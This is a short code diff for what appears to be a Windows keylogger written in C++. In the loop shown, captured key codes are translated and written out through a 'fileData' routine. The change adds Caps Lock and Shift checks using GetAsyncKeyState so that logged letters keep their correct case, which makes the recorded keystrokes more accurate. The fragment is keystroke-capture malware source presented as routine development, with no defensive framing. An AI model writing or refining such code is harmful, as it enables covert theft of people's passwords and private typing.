@@ -60,8 +60,14 @@ int main() {
                 //If its a special key, translate it
                 std::string res = specialKey(keyCode);
                 if(res == "notspecial") {
-                    //Fills the string buffer with 1 copy of the character array.
-                    fileData(std::string(1, char(keyCode)));
+                    //Check if the key pressed should be capitalized or not.
+                    if(GetAsyncKeyState(VK_CAPITAL) || GetAsyncKeyState(VK_SHIFT)) {
+                        //Fills the string buffer with 1 copy of the character array
+                        fileData(std::string(1, char(keyCode)));
+                    } else {
+                        fileData(std::string(1, std::tolower(char(keyCode))));
+                    }
+                   
                 } else {
                     fileData(res);
                 } 
